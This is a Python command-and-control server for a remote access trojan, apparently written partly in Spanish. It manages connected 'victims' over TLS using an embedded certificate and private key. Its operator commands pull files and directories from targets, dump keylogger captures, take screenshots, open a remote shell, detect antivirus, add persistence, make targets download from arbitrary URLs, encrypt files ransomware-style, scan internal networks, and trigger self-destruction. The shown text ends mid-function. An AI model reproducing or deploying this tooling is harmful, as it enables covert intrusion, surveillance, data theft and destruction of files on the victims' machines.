#!/usr/bin/python
import ast
import base64
import json
import os
import pprint
import sys
import socket
import ssl
import tempfile
import threading
from colorama import Fore
import colorama
from base64 import b64decode
from osGuess import init_guess
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.formatted_text import ANSI
colorama.init()

Y = Fore.LIGHTYELLOW_EX
R = Fore.LIGHTRED_EX
B = Fore.LIGHTBLUE_EX
CY = Fore.LIGHTCYAN_EX
G = Fore.LIGHTGREEN_EX
END = Fore.RESET

# Variables globales
history = InMemoryHistory()
session = PromptSession(history=history)
stopAll = False
victims = {
    'ip': [],
    'target': [],
    'os': []
}

def crte():
    return b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMyakNDQWNLZ0F3SUJBZ0lVY2wvZmZVbVc1NlE4cDlFU2VrdnlkVWhFOWJRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF3d05LaTVsZUdGdGNHeGxMbU52YlRBZUZ3MHlNekE1TURZeU1EQXhOVFJhRncweQpOREE1TURVeU1EQXhOVFJhTUJneEZqQVVCZ05WQkFNTURTb3VaWGhoYlhCc1pTNWpiMjB3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUNvOStBTWw0aVpvTzdEZzd5QTB4cUcyaHRGTnZwUExxT3gKbkk1bkNCWVR6azFqV1ZvcjcycXZNOW9iR0lIeG1CWUJ1YXRIS0V0NXJWTzRLNXB2b1NrekdhT3NmUUtYbzcyYgp5TmRYemFKUVN3WFZSSldkcEs1cnpjZlhqdUp3U3BtcHlpN2J5YXlyNlpmNFhPNk1rSFJoNWEzWkNXN1JJSk9MCmJSRndyLzRtWDM2VnU5SVBPdUk0cWFxWmlSa004WmpnUnZ6QWhXaDNubm1hcEtnb3JQSnUwSDNhblBZTkxYU2oKMU5sWUg4MGFQMTQwZkFOaG9zbjRFbHdtRjY1V2xhNU1USlJlbXpxbG5OczA0OTBGOUVxL1hRbkVTS0hRditBKwpOY21abE1rL1pHd2xVWnovbUgxdGt3VkgrZXJnYXBMMk0vR2FPK09MWjdqU2NLU2E3SmVuQWdNQkFBR2pIREFhCk1CZ0dBMVVkRVFRUk1BK0NEU291WlhoaGJYQnNaUzVqYjIwd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFFUHgKeEx3dFdndWcxYkNsaG5hRUFoRU1iL2hBNDBsbE5nSU5sOVptWk5LMUFBZUU0bjVaZ2tzSWZaV1dlUmVYT0p2VQp1TkhON3JFRnAwWktKNmNsSjVPOUk5eG5aU3gzbms4UVN5eFl2RE56Y0QyYTlEMklCcmYwZFROUnJUam8vdlozClBHVythL0lnaWI0dCs1SkljOTV3NEN1S210NFpoT3ZxZmo0bkZXYWpkbjdIZ0lvRnNjeGRVZW82aU00aHArcWcKOU94M0JJRVVTWFg4bDFCdFVodXYyaVZUTTJTdDRXMmk4N1BUVTlDcEMzQ3hYaHpmUHdhNkVNK25uSE9oRkNwQQpvcTI0cVEwS2svckczZVluRCtRTnhHRXdPekF0Q3YzUTZZNlVvMXV1TVNqUDgwaXJtVjREeFlPRFVpUkRaRjZiClNYZWRRcVREVTgyTi96WGpXdVE9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K'


def locker():
    return b'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBcVBmZ0RKZUltYUR1dzRPOGdOTWFodG9iUlRiNlR5NmpzWnlPWndnV0U4NU5ZMWxhCksrOXFyelBhR3hpQjhaZ1dBYm1yUnloTGVhMVR1Q3VhYjZFcE14bWpySDBDbDZPOW04alhWODJpVUVzRjFVU1YKbmFTdWE4M0gxNDdpY0VxWnFjb3UyOG1zcSttWCtGenVqSkIwWWVXdDJRbHUwU0NUaTIwUmNLLytKbDkrbGJ2UwpEenJpT0ttcW1Za1pEUEdZNEViOHdJVm9kNTU1bXFTb0tLenlidEI5MnB6MkRTMTBvOVRaV0IvTkdqOWVOSHdECllhTEorQkpjSmhldVZwV3VURXlVWHBzNnBaemJOT1BkQmZSS3YxMEp4RWloMEwvZ1BqWEptWlRKUDJSc0pWR2MKLzVoOWJaTUZSL25xNEdxUzlqUHhtanZqaTJlNDBuQ2ttdXlYcHdJREFRQUJBb0lCQURNbTF5ejRzdUhQVm5qWgo2TGNYTVhDaGxwL2RoT2x6dFJxUHlveG1aa2lZcTlUbnQrU1ZGamJ6KzVNNFdCNUxiRjRaVjBDemNpWGowdlJ1ClB0S01kMnlBMW92aFRHZWJxa3IvQWpJU2pwREFKWVBxdjJCNStsT29lRmRKYWtPVVVmQ1V4SnJFOHdFWU5tbDUKdUwzVS9XYWxvWHVTMzNsdjR6clNTZlZUVWgxTFROalBXVDVHdnhST3dUMTYzdUpqL05sSGxrdEhwNEhzdDdVLwpoR3l6T0RQWFdBdnZBcG5jeHRTZ2dZdVUwdStTN3M3QndCRmVwbGhTSHJ4K2lleWsvR044amptQVJTL3dLa2U4ClcwYWhFN3hMcU01L3JDbFNFeTU0aExjbzhMbjVVcXVjUmRzUlNxVjBvZXNWbFF4dU03aWJneU9nVmtZd1pxWmUKK2pOK1JBRUNnWUVBNkFpODdKd2F1dTNsY3lnU2toelFRTHNqMlRUYXpNWGxPbVJnc3ROZkRrS0hUUFZ5S290UApSR0x4eUg2YzVmRGhwVUpTdGhTbkpRN1djMWZnazdMSTY0SklnNmc1ajNWRjBFRDZMSHNROGd2YktJZFNERnc2CjJDNDBqNThwZ0YwQ1Y1UWlqd2pWdm1wRU1oTDAzL2d5cm1RV3VJQTJQQURwREtFMFZJaWF4b01DZ1lFQXVtdVoKZ0lhSVBUMWdCQlhaUWdTOUJNWWN2bzNCNXJnUnNMd295ZEliM2VOcUVlS1pRL1htMmJ0c3NIeTdmV2JRSGhYZQp5Y0F6RklMdVppTzRyRUFaQ0F3cjQydmZOVTFoY0tHbzB6QVlyd2dwQ2pEaExvYTF6Smp3RE1UNmRkcG9oZzFHClhWcGlkMG1Dd1hTM2FrTUQzWGFxZmFlYVlObXZwSGRiUmV4dUFRMENnWUVBeEdxcEtvM1dYc2lGQTk4M0lUSjgKNDE3SE1OWDZKWCtiMUxzbDFCcnppMG1yNk95WThRU3VYQkI1NWFPd1EwR09jV3RjUXIvbTRZclc1QnJPZzVqRApWZ0VhUzBDN1FRSWZ6L05CRXlnMkp2NzhUU21IdmVqUTh6RGgwM1lERnFNbEdXZlBmVThZU0xFQiszVnFqckUyCmpjTXlMSXB6M29WU3doc3dCaU1CQ2VzQ2dZQVJ5NU9yb1N3QUxJdXQyQ2dWRlQ2MTVmTjRmUysxUm56cDBneFMKdDZ2UlVwUWRnUFFBZU1qQW9CT1FCVmdnY0dBTmZ5ajFPVk9tOFppd1IxaXBtTFRLLzk1d3B5dDNleHVDRk94NAp2RzZleHJpa01HWk9lcTJBQ2xsZjNxM0o4ajlvREh4YkRQVzVUVnNkL0haRnZuL3Y5QlB5U3IyQjRVWFMvVkhKCkt2aVZRUUtCZ0Z5NUppNjJja1JzRklqNlkxaEhGOElJYVQvYzJ4Um9tL3hzcEtGR3VpUlhOM0Z0eHpEaUhnRGQKMWFsUXZZK1E2TEZIbEVGNlNaK21vaGI1b24xQUZxL2VrRDJtKzduNW5vRkNodENyRUJqK0Y5MnNRcjdqMmVTbQpEWS93dE1BeGhBVlFTd0piM3BlMHM2aFRSSGJZU05qSmlHY2t5WHQ3bkQ2VE9zcncvU1p5Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg=='


def get_crte():
    return b64decode(crte()).decode()


def get_locker():
    return b64decode(locker()).decode()


crt = tempfile.NamedTemporaryFile(delete=False)
crt.write(get_crte().encode())
crt.close()

ky = tempfile.NamedTemporaryFile(delete=False)
ky.write(get_locker().encode())
ky.close()

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
context.load_cert_chain(certfile=crt.name, keyfile=ky.name)


def clean():
    os.system("clear")


def help_option():
    print('''

                Aviable Commands:

                    | [!>] search <extension> -> Search for files with named extension
                    ---------------------------------------------------------
                    | [!>] downloadDir <path> -> Download A full dir
                    ---------------------------------------------------------
                    | [!>] download <path> -> Download A File From Target PC
                    ---------------------------------------------------------
                    | [!>] startTask       -> Monitoring & kill tasks managers
                    ---------------------------------------------------------
                    | [!>] check           -> Check For Administrator Privileges
                    ---------------------------------------------------------
                    | [!>] sysinfo         -> Get System Information
                    ---------------------------------------------------------
                    | [!>] shell           -> Enter Shell Mode 
                    ---------------------------------------------------------
                    | [!>] av              -> Try Detect Anti-Virus
                    ---------------------------------------------------------
                    | [!>] upload <path>   -> Upload local File To Target PC
                    ---------------------------------------------------------
                    | [!>] get <url>       -> Download A File To Target PC From Any Website
                    ---------------------------------------------------------
                    | [!>] persistence     -> Try to get persistence (needed root)
                    ---------------------------------------------------------
                    | [!>] lowpersistence  -> Try to get persistence (no root)
                    ---------------------------------------------------------
                    | [!>] exec <command>  -> Exec command in no shell mode
                    ---------------------------------------------------------
                    | [!>] cryptDir <dir>  -> Crypt a full folder in target
                    ---------------------------------------------------------
                    | [!>] crypt <file>    -> Crypt a file in target
                    ---------------------------------------------------------
                    | [!>] keylog_dump     -> Dump The Keystrokes From Keylogger
                    ---------------------------------------------------------
                    | [!>] screenshot      -> Take a screenshot
                    ---------------------------------------------------------
                    | [!>] scannet         -> Scan all active hosts on target
                    ---------------------------------------------------------
                    | [!>] scanhost <host> -> Scan ports on host
                    ---------------------------------------------------------
                    | [!>] hosts           -> See hosts scanned with scannet
                    ---------------------------------------------------------
                    | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                    ---------------------------------------------------------
                    | [!>] destruction     -> Eliminate ALL and close conex
                    --------------------------------------------------------- 
                    | [!>] q               -> Suspend the conection
                    ---------------------------------------------------------
                    | [!>] exit            -> Terminate the conection
                    ---------------------------------------------------------
    ''')


def start(serverSock, promt):
    while True:
        if stopAll:
            break
        serverSock.settimeout(1)
        try:
            conn, ip = serverSock.accept()

            victims['ip'].append(ip)
            victims['target'].append(conn)
            victims['os'].append(init_guess(ip[0]))
            print(f"\n{Y}[>]{R} New Connection From: {END}{ip}")
        except Exception as e:
            pass


def printVictims(promt):
    if victims['ip']:
        session = 0
        print(f"\n\t\t{R}[  {Y}SESSIONS  {R}]{END}")
        for ip in victims["ip"]:
            os = victims['os'][session]
            print(f"\n{Y}Session:{END} {session}\n\t{R}║")
            print(f"\t║═══► {Y}IP Address:{END} {ip[0]}")
            print(f"\t{R}║═══► {Y}Os Guess:{END} {os}")
            print(f'\t{R}╚═══► {Y}Source Port:{END} {ip[1]}')

            session += 1
        print(f"\n\t     {R}[  {Y}END SESSIONS  {R}]{END}\n")
    else:
        print(f"\n\t\t{R}[  {Y}NO SESSIONS AVIABLE  {R}]{END}")


def setSession(cmd):
    ses = cmd[8:]
    try:
        ses = int(ses)
        ip = victims['ip'][ses]
        targetConn = victims['target'][ses]
        print(f"\n{Y}[>]{B} Setted session {ses}\n")
        mainFunctions(ip, targetConn, ses)
    except ValueError as e:
        print(f"\n{R}[>!] ERROR:{Y} {e}\n")
    except IndexError as e:
        print(f"\n{R}[>!] ERROR:{Y} {e}\n")


def startTaskCommand(targetConn):
    targetConn.send("c3RhcnRUYXNrCg==".encode())
    confirm = targetConn.recv(1024)
    if "successfully".encode() in confirm:
        print(f"\n\t{Y}[*>] {B}Command Send Successfully{END}\n")
        settask = True
    else:
        print(f"\n\t{Y}[*>] {R}Command Send Unsuccessfully...{END}\n")
        settask = False

    return settask


def check(cachedCommands, targetConn, command):
    if command in cachedCommands['commands']:
        print(f"\n{Y}Cached Response:{END} {cachedCommands['commands'][command]}")

    else:
        targetConn.send("Y2hlY2sK".encode())
        admin = targetConn.recv(1024).decode()
        cachedCommands['commands'][command] = admin
        print(admin)
        return admin


def preSetTask(targetConn, cachedCommands, command):
    if command in cachedCommands['commands']:
        print(f"\n{Y}Cached Response:{END} Task already started...\n")
        return
    else:
        cachedCommands['commands'][command] = startTaskCommand(targetConn)
    return cachedCommands['commands'][command]


def recvSys(cachedCommands, targetConn, command):
    if command in cachedCommands['commands']:
        print(f"\n{Y}Cached Response:{END} System Info:{cachedCommands['commands'][command]}\n")
    else:
        targetConn.send("c3lzaW5mbwo=".encode())
        sysinfo = targetConn.recv(2048).decode()
        cachedCommands['commands'][command] = sysinfo
        print(sysinfo)
        return sysinfo


def shell(targetConn, ip):
    targetConn.send("c2hlbGwK".encode())
    prompt = f"{Y}<*{R} Shell {Y}* {ip[0]}>: {END} "

    while True:
        command = session.prompt(ANSI(prompt))

        if command.strip() == "":
            continue

        elif command == "q" or command == "exit":
            targetConn.send("q".encode())
            break

        elif "cd" in command:
            targetConn.send(command.encode())
            print(targetConn.recv(1024).decode())

        else:
            print(command)
            sendAndRecvCmd(targetConn, command)


def sendAndRecvCmd(targetConn, command):
    execCoded = f"ZXhlYwo= {command.replace('exec ', '')}"
    targetConn.send(execCoded.encode())
    response = targetConn.recv(4096)

    if response:
        if "buffer".encode() in response:
            buffer = int(response.decode('utf-8', errors='ignore').replace("buffer ", ""))
            response = targetConn.recv(buffer).decode('utf-8', errors='ignore')
            print(response)

        else:
            response = response.decode('utf-8', errors='ignore')
            if "not found\n" in response:
                print(f"\n {Y}[!] {R}Command Not Found...{END}\n")
            else:
                print(response)


def closeConn(targetConn, ses):
    targetConn.send("Y2xvc2UK".encode())
    targetConn.close()
    ip = victims['ip'][ses]
    conn = victims['target'][ses]
    victims['ip'].remove(ip)
    victims['target'].remove(conn)


def getFile(ip, targetConn, command):
    buffer = 4096
    if not os.path.exists(f'./DATA/{ip[0]}/'):
        os.makedirs(f'./DATA/{ip[0]}')
    codedDownload = "ZG93bmxvYWQK " + command[8:]
    targetConn.send(codedDownload.encode())
    fileData = b""
    with open(f"./DATA/{ip[0]}/{command[8:]}", "wb") as file:
        while True:
            data = targetConn.recv(buffer)
            if "end".encode() in data:
                break

            if len(data) % 4 != 0:
                data += b'=' * (4 - len(data) % 4)
            data = base64.b64decode(data)
            fileData += data

        file.write(fileData)
    print(f"\n\t{Y}[*>]{R} File Downloaded Successfully [./DATA/{ip[0]}]{END}\n")


def getAllFiles(targetConn, command, ip):
    if not os.path.exists(f'./DATA/{ip[0]}/'):
        os.makedirs(f'./DATA/{ip[0]}')

    file_path = command.replace("downloadDir ", "")
    os.makedirs(f"./DATA/{ip[0]}/{file_path}")
    codedDownload = "ZG93bmxvYWREaXIK " + file_path
    targetConn.send(codedDownload.encode())

    total_size = int(targetConn.recv(1024).decode())
    received = 0
    progress_bar_length = 30
    progress = 0

    sys.stdout.write(f"\n{Y}*> {B}Recibiendo datos: {END}[")

    while True:
        # Recibe la ruta del archivo desde el cliente
        relative_path = targetConn.recv(1024).decode()
        if relative_path == 'done':
            # El cliente ha terminado de enviar archivos
            break

        # Crea los directorios necesarios para mantener la estructura original
        os.makedirs(os.path.dirname(f"./DATA/{ip[0]}/{file_path}/{relative_path}"), exist_ok=True)

        # Recibe el archivo y lo guarda en la ubicación correcta
        with open(f"./DATA/{ip[0]}/{file_path}/{relative_path}", 'wb') as f:
            data = targetConn.recv(1024)
            while data:
                if data == "end".encode():
                    break
                f.write(data)
                received += len(data)
                new_progress = int(progress_bar_length * received / total_size)
                if new_progress > progress:
                    sys.stdout.write("▓" * (new_progress - progress))
                    sys.stdout.flush()
                    progress = new_progress
                data = targetConn.recv(1024)

    if progress < progress_bar_length:
        sys.stdout.write("▓" * (progress_bar_length - progress))
    sys.stdout.write("]\n\n")


def detectAV(taretConn, command, cachedCommands):
    if command in cachedCommands['commands']:
        print("\nCached Command: \n\n")
        for av in cachedCommands['commands'][command]:
            print(av)
            #print(f"\t{B}[!>] {Y}Detected Anti-Virus: \n\n\t\t{R}{av}\n{END}")

    else:
        taretConn.send("YXYK".encode())
        print(f"\n{B}[!>] {Y}Info: {END}Detecting Anti-Virus on target...\n")
        print(f"\t{R}[*>] {Y} This may take a while...{END}\n")
        antiViurs = []
        while True:
            res = taretConn.recv(1024)

            if res != "n".encode() and res != "end".encode():
                print(f"\n{B}[!>] {Y}Anti-Virus Detected: {R}{res.decode()}{END}")
                antiViurs.append(f"\n\t{B}[!>] {Y}Anti-Virus Detected: {R}{res.decode()}{END}")

            elif res == "n".encode():
                print(f"\n{B}[*>]{Y} No Anti-Virus Detected!\n")
                antiViurs.append(f"{B}[*>]{Y} No Anti-Virus Detected!")
                break

            elif res == "end".encode():
                break

        cachedCommands['commands'][command] = antiViurs


def upload(command, targetConn):
    codedUpload = f"dXBsb2FkCg== {command.replace('upload ', '')}"
    targetConn.send(codedUpload.encode())
    file = command.replace("upload ", "")
    if os.path.exists(file):

        with open(file, "rb") as fl:
            while True:
                dt = fl.read(4096)
                dt = base64.b64encode(dt)
                if not dt:
                    targetConn.send('end'.encode())
                    break
                targetConn.send(dt)
            fl.close()

        print(f"\n\t{Y}[*>]{R} File Uploaded Successfully\n")
    else:
        print(f"\n\t{R}[*>]{B} Local File Doesn't found...\n")


def getFileURL(command, targetConn):
    url = command.replace("get ", "")
    getCoded = f"Z2V0Cg== {url}"
    targetConn.send(getCoded.encode())
    resp = targetConn.recv(1024)
    if resp == "end".encode():
        print(f"\n\t{Y}[*>] {B}File Downloaded Successfully\n {END}")
    else:
        print("ERROR: " + resp.decode(errors="ignore", encoding="utf-8"))


def tryPersistence(targetConn, cachedCommands):
    if "persistence" in cachedCommands['commands']:
        print(f"{Y}Cached Command: {END}\n\t{cachedCommands['commands']['persistence']}")
        return

    persistenceCoded = "cGVyc2lzdGVuY2UK"
    targetConn.send(persistenceCoded.encode())
    res = targetConn.recv(1024)

    if res == "no_root".encode():
        cachedCommands['commands']['persistence'] = f"\n\t{Y}[!>]{R} No Suficient Privileges...\n"
        print(f"\n\t{Y}[!>]{R} No Suficient Privileges...\n")
    elif res == "root":
        cachedCommands['commands']['persistence'] = f"\n\t{Y}[!>]{B} Persistence successfully added...\n"
        print(f"\n\t{Y}[!>]{B} Persistence successfully added...\n")
    else:
        print(f"\n\t{R}[!>]{Y} Error trying persistence...\n")


def lowPersistence(targetConn, cachedCommands):
    if "lowpersistence" in cachedCommands['commands']:
        print(f"{Y}Cached Command: {END}\n\t{cachedCommands['commands']['lowpersistence']}")
        return

    persistenceCoded = "bG93cGVyc2lzdGVuY2UK"
    targetConn.send(persistenceCoded.encode())
    res = targetConn.recv(1024)
    if res == "done".encode():
        cachedCommands['commands']['lowpersistence'] = f"\n\t{Y}[!>]{B} Low Persistence successfully added...\n"
        print(f"\n\t{Y}[!>]{B} Low Persistence successfully added...\n")
    else:
        print(f"\n\t{R}[!>]{Y} Error trying persistence...\n")


def cryptDir(targetConn, command):
    codedCrypt = "Y3J5cHREaXIK " + command.replace("cryptDir ", "")
    targetConn.send(codedCrypt.encode())
    res = targetConn.recv(1024)
    if res == "done".encode():
        print(f"\n\t{Y}[*>] {B}Dir Crypted Successfully{END}\n")
    else:
        print(f"\n\t{Y}[*>] {R}Dir Crypted Unsuccessfully{END}\n")


def reciveKeylog(targetConn, ip):
    codedCommand = "a2V5bG9nX2R1bXAK"
    targetConn.send(codedCommand.encode())
    keylog_data = "".encode()
    done = False

    # Datos de da barra de carga
    received = 0
    total_received = 0
    progress_bar_length = 20
    progress = 0

    sys.stdout.write(Y + "\nRecibiendo datos: [" + Fore.RESET)
    while True:
        chunk = targetConn.recv(1024)
        keylog_data += chunk
        total_received += len(chunk)

        if '[+] Keylog sent successfully.'.encode() in keylog_data:
            keylog_data = keylog_data.replace('"[+] Keylog sent successfully."'.encode(), b"")
            done = True
            break

        else:
            received += len(chunk)
            new_progress = int(progress_bar_length * received / total_received)
            if new_progress > progress:
                sys.stdout.write(R + "▓" * (new_progress - progress))
                sys.stdout.flush()
                progress = new_progress

    # Printeamos la ultima parte de la barra
    if progress < progress_bar_length:
        sys.stdout.write("▓" * (progress_bar_length - progress))
    sys.stdout.write(Y + "]\n" + Fore.RESET)
    with open(f"./DATA/{ip[0]}/keylog.txt", "ab") as keylog:
        keylog.write(keylog_data)

    if done:
        print(Y + "\n\t[" + R + "+" + Y + "] " + G +
              "Recived Keylog Dump Succesfully!\n" + Fore.RESET)
    else:
        print(Y + "\n\t[" + B + "-" + Y + "] " + CY +
              "Recived Keylog Dump Unsuccesfully!\n" + Fore.RESET)


def reciveScreenshot(targetConn, ip):
    codedCommandd = "c2NyZWVuc2hvdAo=".encode()
    targetConn.send(codedCommandd)
    counter = 0
    screenshot_filename = f"screenshot_received-{counter}.png"

    with open(f"./DATA/{ip[0]}/" + screenshot_filename, 'wb') as file_screenshot:
        received = 0
        total_received = 0
        progress_bar_length = 20
        progress = 0
        sys.stdout.write(Fore.YELLOW + "\nRecibiendo datos: [" + Fore.RESET)
        sys.stdout.flush()

        while True:
            data = targetConn.recv(1024)
            if "[+] Screenshot sent successfully.".encode() in data or not data:
                data = data.replace('"[+] Screenshot sent successfully."'.encode(), "".encode())
                file_screenshot.write(data)
                break
            file_screenshot.write(data)

            total_received += len(data)
            received += len(data)
            new_progress = int(progress_bar_length * received / total_received)

            if new_progress > progress:
                sys.stdout.write(R + "▓" * (new_progress - progress))
                sys.stdout.flush()
                progress = new_progress

        if progress < progress_bar_length:
            sys.stdout.write("▓" * (progress_bar_length - progress))
        sys.stdout.write(Y + "]\n" + Fore.RESET)

    print(Y + "\n\t[" + R + "+" + Y + "] " + G +
          f"Screenshot Saved As 'DATA/{ip[0]}/{screenshot_filename}'!\n" + Fore.RESET)

    counter += 1


def cryptFile(targetConn, command):
    codedCommand = command.replace("crypt", "Y3J5cHQK")
    targetConn.send(codedCommand.encode())
    result = targetConn.recv(1024)
    if result == "True".encode():
        print(
            Y + "\n\t[" + R + "+" + Y + "] " + R +
            "File Crypted Sucsessfully \n" + Fore.RESET)
    else:
        print(
            Y + "\n\t[" + B + "-" + Y + "] " + R +
            f" File Crypted Unsuccsefully \n\t{result}\n" + Fore.RESET)


def selectNet(ips):
    network = None
    print(f"\n{Y}[*>] Networks Detected:\n\n\t{END}{ips}")
    while not network:
        network = session.prompt(ANSI(f"\n{B}[!>] {Y}Select Network{END} > "))
        if network not in ips:
            print(f"{R}Bad Network...")
            network = None

    return network

def scannet(targetConn, command, cachedCommands):
    codedCommand = command.replace("scannet", "çc2Nhbm5ldAo=")
    targetConn.send(codedCommand.encode())
    ips = targetConn.recv(1024).decode()
    ips = ast.literal_eval(ips)
    net = selectNet(ips)
    targetConn.send(net.encode())
    cachedCommands['commands'][command] = []
    print(f"{B}[*>] {END} Scanning Net, this may take a while")
    nhosts = int(targetConn.recv(1024).decode())
    ndo = 1
    while ndo <= nhosts:
        hst = targetConn.recv(1024).decode()
        cachedCommands['commands'][command].append(hst)
        print(f"\t{Y}[*>]{END} HOST: {hst}\n")
        ndo += 1


def scanhost(targetConn, command, cachedCommands):
    if command in cachedCommands['commands']:
        print(f"\n{Y}Cached Command:\n{END}")
        printProcessData(cachedCommands['commands'][command])
        return 2
        #print("\n{}Cached Command: {}HOST: {}\n\t\tPORTS: {}".format(Y, END, command.replace("scanhost", ""), cachedCommands['commands'][command]))

    else:
        coded = command.replace("scanhost", "c2Nhbmhvc3QK")
        targetConn.send(coded.encode())
        print(f"{B}[*>] {END}Wait For The results {command.replace('scanhost ', '')}...\n\t")
        while True:
            data = targetConn.recv(4096).decode()
            if "Scaning" in data:
                print(data, end="\r")
            elif "Error" in data:
                print("\n", data)
                return 1
            else:
                print(f"\n\n\t[>] Open Ports: {data}\n")
                cachedCommands['commands'][command] = data
                break
    return 0


def scanPorts(ports, host, targetConn, cachedCommands, command):
    print(f"{R}[*>] {Y}Scanning service of ports. This may take a while - {host} - {ports}{END}")
    buffer = int(targetConn.recv(1024).decode().replace("buffer ", ""))
    while True:
        data = targetConn.recv(buffer + 10)
        if data == "formed data".encode():
            data = targetConn.recv(buffer + 10).decode()
            break
    data = ast.literal_eval(data)
    cachedCommands['commands'][command] = data
    return data


def printProcessData(formedData):
    for ip in formedData[0]:
        print(f"\n{Y}[*>] IP ADDRES -> {END}{ip}")
        for port in formedData[0][ip]:
            try:
                servicedata = ast.literal_eval(formedData[0][ip][port])
                probename = servicedata.get('probe', {}).get('probename')
                probestr = servicedata.get('probe', {}).get('probestring')
                pattern = servicedata.get('match', {}).get('pattern')
                versioninfo = servicedata.get('match', {}).get('versioninfo', {})
                vendorproduct = versioninfo.get('vendorproductname')
                version = versioninfo.get('version')
                info = versioninfo.get('info')
                hostname = versioninfo.get('hostname')
                os = versioninfo.get('operatingsystem')
                cpename = versioninfo.get('cpename')

                # Print only if the variable exists
                print(f"\n\t{Y}[*>] PORT: {END}{port}")
                if probename or probestr or pattern or vendorproduct or version or info or hostname or os or cpename:
                    if probename: print(f"{B}\t\tProbe Name:{END}\t {probename}")
                    if probestr: print(f"{B}\t\tProbe String:{END}\t {probestr}")
                    if pattern: print(f"{B}\t\tPattern:{END}\t {pattern}")
                    if vendorproduct: print(f"{B}\t\tVendor Product:{END}\t {vendorproduct}")
                    if version: print(f"{B}\t\tVersion:{END}\t {version}")
                    if info: print(f"{B}\t\tInformation:{END}\t {info}")
                    if hostname: print(f"{B}\t\tHostname:{END}\t {hostname}")
                    if os: print(f"{B}\tOperating System:{END}\t {os}")
                    if cpename: print(f"{B}\t\tCPE Name:{END}\t {cpename}")
                else:
                    print("\t\tUnknown")
            except SyntaxError:
                print(f"\n\t{Y}[*>] PORT: {END}{port}\n\t\t{formedData[0][ip][port]}")


def hosts(cachedCommands):
    try:
        print("\n\t", cachedCommands['commands']["scannet"], "\n")
    except NameError:
        print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
    except KeyError:
        print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")


def scanHost(targetConn, command, cachedCommands):
    res = scanhost(targetConn, command, cachedCommands)
    if res == 0:
        formedData = scanPorts(cachedCommands['commands'][command], command.replace("scanhost ", ""), targetConn,
                               cachedCommands, command)
        printProcessData(formedData)
    elif res == 2:
        pass
    else:
        print("\nERROR SCANNING HOST...")


def printFormedFiles(fles):
    print(f"\n{Y}[*>]{R} Files find:{END}\n")
    for file in fles:
        print(f"\t{Y}[*>]{B} {file}")
    print("\n")


def receiveFileList(targetConn):
    # Receive the total length of the JSON string as a header
    total_length = int(targetConn.recv(4096).decode())

    data = ""
    while len(data) < total_length:
        chunk = targetConn.recv(4096).decode()
        data += chunk

    # Convert the received JSON string back to a list
    fnded = json.loads(data)

    return fnded


def searchExt(command, ext, targetConn, cachedCommands):
    if command in cachedCommands['commands']:
        print(f"\n{Y}Cached Response:{END}")
        printFormedFiles(cachedCommands['commands'][command])
        return
    print(f"\n\t{Y}[*>] {END}Searching .{ext} files. This may take a {R}while{END}... \n")
    codedCommand = "c2VhcmNo {}".format(ext)
    targetConn.send(codedCommand.encode())
    buffer = targetConn.recv(2048)
    if "prt".encode() in buffer:
        f = receiveFileList(targetConn)
    else:
        buffer = buffer.decode().replace("buffer ", "")
        f = targetConn.recv(int(buffer)).decode()
        f = ast.literal_eval(f)

    cachedCommands['commands'][command] = f
    printFormedFiles(f)


def autoDestruction(targetConn, ses):
    codedCommand = "ZGVzdHJ1Y3Rpb24K"
    targetConn.send(codedCommand.encode())
    targetConn.close()
    ip = victims['ip'][ses]
    conn = victims['target'][ses]
    victims['ip'].remove(ip)
    victims['target'].remove(conn)


def mainFunctions(ip, targetConn, ses):
    if not os.path.exists(f"./DATA/{ip[0]}"):
        os.makedirs(f"./DATA/{ip[0]}")
    try:
        cachedCommands = {'commands': {}}
        prompt = f"{Y}<*{R} C&C {Y}* {ip[0]}>: {END} "

        while True:
            command = session.prompt(ANSI(prompt))
            if command == "":
                targetConn.send(" ".encode())
                print(targetConn.recv(1024).decode(), end="")

            elif command == "exit":
                closeConn(targetConn, ses)
                break

            elif command.startswith("q"):
                break

            elif command.startswith("help"):
                help_option()

            elif command.startswith("startTask"):
                preSetTask(targetConn, cachedCommands, command)

            elif command.startswith("check"):
                check(cachedCommands, targetConn, command)

            elif command.startswith('sysinfo'):
                recvSys(cachedCommands, targetConn, command)

            elif command[:11] == 'downloadDir':
                getAllFiles(targetConn, command, ip)

            elif command[:8] == 'download':
                getFile(ip, targetConn, command)

            elif command.startswith('upload'):
                upload(command, targetConn)

            elif command.startswith('exec'):
                sendAndRecvCmd(targetConn, command)

            elif command.startswith("av"):
                detectAV(targetConn, command, cachedCommands)

            elif command.startswith("get"):
                getFileURL(command, targetConn)

            elif command.startswith("persistence"):
                tryPersistence(targetConn, cachedCommands)

            elif command.startswith("lowpersistence"):
                lowPersistence(targetConn, cachedCommands)

            elif command[:8] == "cryptDir":
                cryptDir(targetConn, command)

            elif command[:5] == "crypt":
                cryptFile(targetConn, command)

            elif command.startswith('shell'):
                shell(targetConn, ip)

            elif command.startswith("keylog_dump"):
                reciveKeylog(targetConn, ip)

            elif command.startswith("screenshot"):
                reciveScreenshot(targetConn, ip)

            elif command.startswith("scannet"):
                scannet(targetConn, command, cachedCommands)

            elif command == "hosts":
                hosts(cachedCommands)

            elif command.startswith("scanhost"):
                scanHost(targetConn, command, cachedCommands)

            elif command.startswith("search"):
                extension = command.replace("search ", "")
                searchExt(command, extension, targetConn, cachedCommands)

            elif command.startswith("destruction"):
                autoDestruction(targetConn, ses)
                break



    except BrokenPipeError as e:
        print(f"\n{R}[>!] ERROR:{Y} {e}\n")
        closeConn(targetConn, ses)


def sendAll(command):
    command = command.replace("sendall", "")
    codedCommandSplit = command.split(" ")
    stringformed = base64.b64encode((codedCommandSplit[1] + '\n').encode()).decode().strip()

